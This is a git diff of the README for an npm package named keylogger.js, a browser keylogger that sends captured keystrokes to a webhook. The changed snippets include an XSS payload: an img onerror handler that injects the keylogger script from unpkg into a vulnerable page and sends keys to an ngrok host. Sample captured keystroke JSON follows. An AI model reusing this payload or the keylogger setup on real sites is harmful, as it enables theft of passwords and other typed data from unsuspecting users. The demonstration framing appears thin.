@@ -21,10 +21,6 @@ npm install @mihnea.dev/keylogger.js
 # Using yarn
 yarn add @mihnea.dev/keylogger.js
 ```
-If you prefer embedding the library directly in your HTML file, include the script:
-```html
-<script src="https://..."></script>
-```
 
 ## Usage
 To use keylogger.js in your web application, you need to import the library and initialize it with your webhook URL:
@@ -40,7 +36,9 @@ Should you embed the script directly in your HTML file, you can initialize the l
 
 ```html
 <script>
-  const _ = new Keylogger('https://your-webhook-url.com');
+    import Keylogger from 'https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js';
+    const keylogger = new Keylogger('https://your-webhook-url.com', false);
+    console.log('Keylogger initialized:', keylogger);
 </script>
 ```
 
@@ -72,13 +70,14 @@ This step demonstrates embedding Keylogger.js into a vulnerable webpage as part 
 ```html
 <img src="invalid.jpg" onerror="
     const script = document.createElement('script');
-    script.src = 'https://your-cdn-link.com/keylogger.js';
+    script.src = 'https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js';
     document.body.appendChild(script);
     script.onload = () => {
-        const _ = new Keylogger('https://<random-id>.ngrok.io', true);
+        const _ = new Keylogger('https://<random-id>.ngrok.io', false);
     };
 ">
 ```
+![keylogger js](https://github.com/user-attachments/assets/716178d9-5a57-4bdd-9bc6-2788a705c05f)
 
 ### Observing Results:
 1. The Keylogger.js library captures keystrokes and sends them to the webhook.
@@ -87,8 +86,8 @@ This step demonstrates embedding Keylogger.js into a vulnerable webpage as part 
 Decoded Payload: {"type":"keypress","value":"a","session":{...}}
 Parsed JSON:
 {
-    "type": "keypress",
-    "value": "a",
+    "type": "enter",
+    "value": "asdf",
     "session": {
         "id": "unique-session-id",
         "created_at": "2024-11-29T18:00:00Z",
